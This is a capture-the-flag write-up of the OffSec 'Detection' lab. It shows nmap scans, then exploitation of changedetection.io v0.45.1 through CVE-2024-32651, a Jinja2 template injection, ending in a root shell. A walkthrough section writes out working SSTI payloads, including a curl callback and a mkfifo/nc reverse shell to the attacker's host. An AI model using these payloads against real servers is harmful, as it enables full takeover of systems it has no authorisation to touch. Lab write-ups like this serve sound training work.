---
title: Detection
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Detection]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.165.97 
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-13 09:14 +0900
Nmap scan report for 192.168.165.97
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 11.16 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Detection]
└─$ sudo nmap -Pn -p5000 -sSCV -A -oN full_tcp-scan.txt --open 192.168.165.97   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-13 09:19 +0900
Nmap scan report for 192.168.165.97
Host is up (0.083s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Asus RT-AC66U router (Linux 2.6) (95%), D-Link DIR-835 WAP (95%), Android 9 - 11 (Linux 4.9 - 4.14) (95%), HP MSM765zl WLAN controller (95%), Linux 2.4.21 - 2.4.25 (embedded) (95%), Asus RT-N10 router or AXIS 211A Network Camera (Linux 2.6) (95%), Linux 2.6.18 (95%), Asus RT-N16 WAP (Linux 2.6) (95%), Asus RT-N66U WAP (Linux 2.6) (95%), Tomato 1.28 (Linux 2.6.22) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 5000/tcp)
HOP RTT      ADDRESS
1   82.24 ms 192.168.45.1
2   82.19 ms 192.168.45.254
3   82.83 ms 192.168.251.1
4   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.06 seconds
```

http://192.168.165.97:5000/

![](../../../assets/images/Pasted%20image%2020260613092353.png)

- v0.45.1

![](../../../assets/images/Pasted%20image%2020260613152927.png)
*脆弱性がありそう*

https://github.com/s0ck3t-s3c/CVE-2024-32651-changedetection-RCE/blob/main/CVE-2024-32651.py

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Detection]
└─$ python3 -m venv venv                                                                         
source venv/bin/activate
pip install requests
```

![](../../../assets/images/Pasted%20image%2020260613153742.png)

---

# Initial Access

```zsh
┌──(venv)─(kali㉿kali)-[~/CTF/OffSec/Practice/Detection]
└─$ python3 CVE-2024-32651.py --url http://changedetection.io:5000 --port 4444 --ip 192.168.45.204


```
![](../../../assets/images/Pasted%20image%2020260613153807.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Detection]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.204] from (UNKNOWN) [192.168.165.97] 43738
root@detection:/# 
```

```zsh
root@detection:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@detection:/# cat /root/proof.txt
cat /root/proof.txt

root@detection:/# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:61:4f brd ff:ff:ff:ff:ff:ff
    inet 192.168.165.97/24 brd 192.168.165.255 scope global ens160
       valid_lft forever preferred_lft forever
```

<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Summary
The server access is gained by exploiting the change detection web app, which has a publicly available exploit responsible for providing Remote Code Execution (RCE) on the server.

Applications/Servers
Application-1: Changedetection.io
Detect website content changes and perform meaningful actions - trigger notifications via Discord, Email, Slack, Telegram, API calls and many more.

Version: v0.45.1

CVE: CVE-2024-32651

CVE Description: changedetection.io is an open source web page change detection, website watcher, restock monitor and notification service. There is a Server Side Template Injection (SSTI) in Jinja2 that allows Remote Command Execution on the server host. Attackers can run any system command without any restriction and they could use a reverse shell. The impact is critical as the attacker can completely takeover the server machine. This can be reduced if changedetection is behind a login page, but this isn't required by the application (not by default and not enforced).

POC/Reference: https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3

Skills Learned
CVE

SSTI

Tools Used
Nmap

Firefox

Nmap
Starting with an Nmap scan. We have 2 open ports.

nmap -Pn --open <IP> -p-


On Port 22:

As default ssh is running.

On Port 5000:

We can see from the title that changedectection.io (version: v0.45.1) is running.



The version of the changedetection.io webapp can be seen the in the top right of the page i.e v0.45.1.

If we search for the exploit in google, we can find a recent CVE. The running version of change detection is exploitatable to the CVE-2024-32651.



Exploit
Exploiting CVE
Link: https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3

POC:
Click on edit button on one of the watch items



Go to the Notifications tab



Since we have not setup the notifcations app yet the exploit is going to be blind command injection. Let's first check if the payload is working or not

Start local server

python3 -m http.server 8001

On the Notification Body filed add the below payload

{{ self.**init**.**globals**.**builtins**.**import**('os').popen('curl [http://<IP>:<PORT>').read()](http://192.168.1.75:8001').read()) }}

Note: Replace <IP>:<PORT> with yours respectively



Save it

As we can see we hit the request. We are now sure that we can execute commands


Listen netcat on your local machine

rlwrap ncat -klvnp 1234
-k - Accept multiple connections in listen mode

Let's get a reverse shell

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <PORT> >/tmp/f').read() }}

Note: Replace <IP>:<PORT> with yours respectively



Save it

We have the shell



We are root.

Thank You :)
```

</details>